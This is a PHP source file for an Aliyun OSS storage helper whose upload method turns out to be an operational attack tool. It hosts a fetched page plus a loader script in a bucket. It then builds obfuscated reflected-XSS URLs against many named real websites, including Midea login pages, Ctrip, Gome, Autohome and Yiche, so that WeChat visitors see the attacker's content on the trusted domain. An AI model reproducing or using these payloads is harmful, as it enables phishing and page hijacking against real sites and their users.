<?php
use OSS\OssClient;
use OSS\Core\OssException;
//https://help.aliyun.com/document_detail/32105.html
class oss_model extends base_model {
	public $url;
	private $accessKeyId;
	private $accessKeySecret;
	private $endpoint;
	private $bucket;
	private $storeClient;
	
	public function __construct() {
		parent::__construct();
		require_once(SDK_PATH . '/class/aliyun-oss/autoload.php');
		$options = defined('OSS_OPTIONS') ? json_decode(OSS_OPTIONS, true) : array();
		if (!count($options)) exit('MISSING OSS OPTIONS');
		$this->accessKeyId = $options['accessKeyId'];
		$this->accessKeySecret = $options['accessKeySecret'];
		$this->endpoint = $options['endpoint'];
		$this->bucket = $options['bucket'];
		$this->url = "{$this->bucket}.".str_replace('http://', '', $this->endpoint);
		try {
			$this->storeClient = new OssClient($this->accessKeyId, $this->accessKeySecret, $this->endpoint);
		} catch (OssException $e) {
			error($e->getMessage());
		}
	}
	
	//上传文件
	public function putFile($bucket, $key, $file) {
		$this->putObject($bucket, $key, file_get_contents($file));
	}
	public function putObject($bucket, $key, $content) {
		$this->url = "{$this->bucket}.".str_replace('http://', '', $this->endpoint);
		try {
			$this->storeClient->putObject($this->bucket, $key, $content);
		} catch (Exception $e) {
			error($e);
		}
	}
	
	private function _dependencies() {
		$files = array(
			'css' => array('mobile.css', 'animation.css', 'alertUI.css'),
			'images' => array('404.svg', 'touch.jpg'),
			'js' => array('coo.js', 'inobounce.js', 'jquery-3.4.1.min.js', 'mobile.js', 'scene.js'),
			'404.html'
		);
		$putObject = function($path) {
			$this->storeClient->putObject($this->bucket, $path, file_get_contents(ROOT_PATH."/console/bucket/{$path}"));
		};
		foreach ($files as $key => $list) {
			if (is_string($list)) {
				$putObject($list);
				continue;
			}
			foreach ($list as $file) {
				$putObject("{$key}/{$file}");
			}
		}
	}
	
	//把对象储存的文件删除
	public function delete($path, $bucket='') {
		set_time_limit(0);
		ini_set('memory_limit', '10240M');
		if (is_string($path) && !strlen($path)) return false;
		if (!is_array($path)) $path = array($path);
		if (!count($path)) return false;
		if (strlen($bucket)) $this->bucket = $bucket;
		$this->url = "{$this->bucket}.".str_replace('http://', '', $this->endpoint);
		try {
			$objects = array();
			foreach ($path as $p) {
				$objects[] = $p;
			}
			$this->storeClient->deleteObjects($this->bucket, $objects);
		} catch (OssException $e) {
			error($e->getMessage());
		}
		return true;
	}
	
	//上传到对象储存
	public function upload($dir, $url, $type='lmm', $return_array=0, $bucket='') {
		set_time_limit(0);
		ini_set('memory_limit', '10240M');
		if (strlen($bucket)) $this->bucket = $bucket;
		$this->url = "{$this->bucket}.".str_replace('http://', '', $this->endpoint);
		$third = "https://{$this->url}/{$dir}/web.html";
		$parent = '';
		$js = "var ua = navigator.userAgent.toLowerCase();
if (/micromessenger/i.test(ua)) {
	var xhr = new XMLHttpRequest;
	var html = null;
	function render () {
		var a = document.open('text/html', 'replace');
		a.write(html);
		a.close();
	}
	xhr.onload = function () {
		html = xhr.responseText;
		var delay = 0;
		if (delay > 0) setTimeout('render()', delay * 1000);
		else render();
	};
	xhr.open('GET', '{$third}?t=' + Date.now(), !0);
	xhr.send();
}";
		$html = requestData('get', $url);
		try {
			$this->storeClient->putObject($this->bucket, "{$dir}/js", $js);
			$this->storeClient->putObject($this->bucket, "{$dir}/web.html", $html);
		} catch (OssException $e) {
			error($e->getMessage());
		}
		switch ($type) {
			case 'lmm':
				$base64 = base64_encode("https://{$this->url}/{$dir}/js");
				$parent = "http://train.lvmama.com/booking/shanghai-nanjing?from_station=SHH&to_station=231%27%3B%7D%7D%24.getScript(atob(%27{$base64}%27))%3Bfunction%20a()%7Bif(true)%7Bvar%20a=%271";
				break;
			case '8684':
				$base64 = base64_encode("<script src=\"//{$this->url}/{$dir}/js\"></script>");
				$parent = "https://m.8684.cn/csmap?bl=7fb7736b&s=1zqjwh%22)%3bdocument%5B%27write%27%5D%28atob%28%27{$base64}%27%29%29%3b//";
				break;
			case 'mjdp':
				$charCodeAt = function($str) { //等同于js的charCodeAt()
					$uniord = function($str, $from_encoding = false) {
						$from_encoding = $from_encoding ? $from_encoding : 'UTF-8';
						if (strlen($str) == 1) return ord($str);
						$str = mb_convert_encoding($str, 'UCS-4BE', $from_encoding);
						$tmp = unpack('N', $str);
						return $tmp[1];
					};
					$result = array();
					for ($i=0, $l=mb_strlen($str, 'utf-8'); $i<$l; ++$i) {
						$result[] = $uniord(mb_substr($str, $i, 1, 'utf-8'));
					}
					return join(',', $result);
				};
				$base64 = $charCodeAt("document.body.appendChild(document.createElement('script')).src='https://{$this->url}/{$dir}/js'");
				$parent = "http://dianping.bitauto.com/mingjueehs/koubei/1%7D;eval(String.fromCharCode({$base64}));var%20a=%7Ba:1";
				break;
			case 'midea':
				$charCodeAt = function($str) {
					$result = array();
					$arr = str_split($str, 1);
					foreach ($arr as $_arr) {
						$result[] = '%'.bin2hex($_arr);
					}
					return join('', $result);
				};
				$base = $charCodeAt("//{$this->url}/{$dir}/js");
				$parent = "https://oamuat.midea.com/exlogincom/sso.do?l287prhe=q97g&authn_try_count=169%22%0A%24(%22*%22).hide()%0A%24.getScript(%22{$base}%22)%0A%2F**&q=22_sq_ynl";
				break;
			case 'zgdx':
				$base = base64_encode("<script src=https://{$this->url}/{$dir}/js></script>");
				$base = base64_encode("javascript:document[`write`](atob(`{$base}`));");
				$parent = "http://gd.189.cn/transaction/taocanapply1.jsp?latn_id=1zqjke%22%3b%20location.href=atob%60{$base}%60%3bvar%20c=%222";
				break;
			case 'midea2':
				$base = base64_encode("<script src=\"//{$this->url}/{$dir}/js\"></script>");
				$base = base64_encode("javascript:document.write(atob(`{$base}`))");
				$parent = "https://oamuat.midea.com/logincom/obssso.do?olprhe=5&authn_try_count=1%22%3Blocation.href%3Datob%28%60{$base}%60%29%3B%2F%2F&lw=ZjbcZfbKK25vcorV0v4N0A%3D%3D&pt=2&vs=60&tmv=1599882700365";
				break;
			case 'ctrip':
				$charCodeAt = function($str) {
					$result = array();
					$arr = str_split($str, 1);
					foreach ($arr as $_arr) {
						$result[] = '%'.bin2hex($_arr);
					}
					return join('', $result);
				};
				$base = $charCodeAt("1';$('*').hide();\$jQuery.getScript(\"//{$this->url}/{$dir}/js\");//");
				$parent = "https://trains.ctrip.com/trainBooking/search?ticketType=0&fromCn=%E6%AD%A3%E5%9C%A8%E5%8A%A0%E8%BD%BD%3C/title%3E&mkt_header={$base}&q=e732ec471db94f75bd45b8409f7f7982&vs=3";
				break;
			case 'midea3':
				$base = base64_encode("<script src=https://{$this->url}/{$dir}/js></script>");
				$base = base64_encode("javascript:document[`write`](atob(`{$base}`))");
				$base = urlencode("\"; location.href=atob`{$base}`;var c=\"");
				$parent = "https://loginnh.midea.com/exlogin/sso.do?lan=3&p_error_code=1{$base}&q=a15ef1a63a30713f28879d95f889a891&vs=4";
				break;
			case 'midea4':
				$base = base64_encode("<script src=https://{$this->url}/{$dir}/js></script>");
				$base = base64_encode("javascript:document[`write`](atob(`{$base}`))");
				$base = urlencode("\"; location.href=atob`{$base}`;var c=\"");
				$parent = "https://loginnh.midea.com/login/%05/%05sso.do?lan=3&p_error_code=1{$base}&q=61469f91582c15b70f89647b5cc35ba8&vs=4";
				break;
			case 'midea5':
				$base = base64_encode("<script src=https://{$this->url}/{$dir}/js></script>");
				$base = base64_encode("javascript:document[`write`](atob(`{$base}`))");
				$_third = base64_encode($third);
				$parent = "https://loginnh.midea.com/login/%18/obssso.do?lan=3&p_error_code=1%22%3B%20location.href%3Datob%60{$base}%60%3Bvar%20c%3D%22&lw=7b84e63d8d01e4c8c6ca228deff4dc28&tmw=1602151803285&refurl={$_third}#forward";
				break;
			case 'lalian':
				$base = base64_encode("<script src=//{$this->url}/{$dir}/js></script>");
				$parent = "http://m.zipperrc.com/jobs-list.php/XqLnU66LTM4OUxhq?8yzzrML4=zrrUh632&key=ddddd%22%3E%3Cb%0fody%2Fhidd%0fen%3E%3Csv%0fg%3E%3Canimate%20onbeg%0fin%3D(docu%0fment.body.hi%0fdden%3D1)%3B(doc%0fument.wr%0fite%0f(at%0fob%0f(%60{$base}%60)))%20attributeName%3Dx%20dur%3D1s%3E%3C%0f!--&pcMxQo0=Jh8SYSZkPSoWOxxsChVmBA40oQxMcpEhG94rPrsLHz5O7ivr38tL3j5PWh5PGsr_vtv-7voe6498_S1p7ezNbXzdvYyILOwcI#1603624945272";
				break;
			case 'yiche':
				$base = base64_encode("<script src=//{$this->url}/{$dir}/js></script>");
				$parent = "http://i.m.yiche.com/AuthenService/AboutPassword/RetrievePassword.html?returnurl=http%3A%2F%2Fi.mai.m.yiche.com%2Fxxxxxxxxxxxxxxxxx%27%29%7D%29%3Bdocument%5B%27write%27%5D%28atob%28%27{$base}%27%29%29%3BsetTimeout%28function%28%29%7Bconsole.log%28%27&U2FsdGVkX1zzdsgbfh2FFWpp2YLj9flulFy399Z0HrEaJQvhuKgAu6kBI1TwDzzdsgbfh2FDFvFeYEYtkt1deblw36o2gyk0lSIckCLzzdsgbfh2Fzzdsgbfh2FPxzzdsgbfh2FQ500BKn6nG8xycNuDuKq4zyyOaTzzdsgbfh2FnJDk9D3EG6=#1604118677647";
				break;
			case '78dm':
				$base = base64_encode("<script src=//{$this->url}/{$dir}/js></script>");
				$_third = base64_encode($third);
				$parent = "http://www.78dm.net/search?keyword=1zqjmi%22%7d%7d)%7d%3bdocument%5B%27write%27%5D%28atob%28%27{$base}%27%29%29%3bfunction%20s()%20%7b%24.ajax(%7bd%3a%7bd:%222&refurl={$_third}#forward";
				break;
			case 'gome':
				$base = base64_encode("<script src=https://{$this->url}/{$dir}/js></script>");
				$base = base64_encode("javascript:document[`write`](atob(`{$base}`))");
				$base = urlencode($base);
				$parent = "https://login.gome.com.cn/%05popLogin.no?orginURI=1%27%3B%20location.href%3Datob%60{$base}%60%3B%2F%2F&q=20664863285d2f774b4928343dfadea1&vs=1604721581906#wechat_redirect_1604721586511";
				break;
			case 'wenweipo':
				$base = "document.body.appendChild(document.createElement('script')).src='https://{$this->url}/{$dir}/js';";
				$parent = "http://paper.wenweipo.com/catList-s.php/1zqjqs');{$base}///?cat=702CG&loc=any&year=2004&wyl=gogo&refurl=aHR0cHM6Ly9xaW5zaGFuLm9zcy1jbi1xaW5nZGFvLmFsaXl1bmNzLmNvbS9oLzExMDcwMS5odG1s#forward";
				break;
			case 'autohome':
				$base = base64_encode("https://{$this->url}/{$dir}/js");
				$_third = base64_encode($third);
				$parent = "http://safety.autohome.com.cn/userverify/index.jsp?locnum=109707&backurl=//club.autohome.com.cn/bbs/thread/eb51088b8bd78bdf/27698581-1.html&notificationurl=1zqjlo%27%3b%24.getScript(atob(%27{$base}%27))%3bvar%20a=%271&refurl={$_third}";
				break;
		}
		return $return_array==0 ? $parent : array($parent, $third);
	}
}
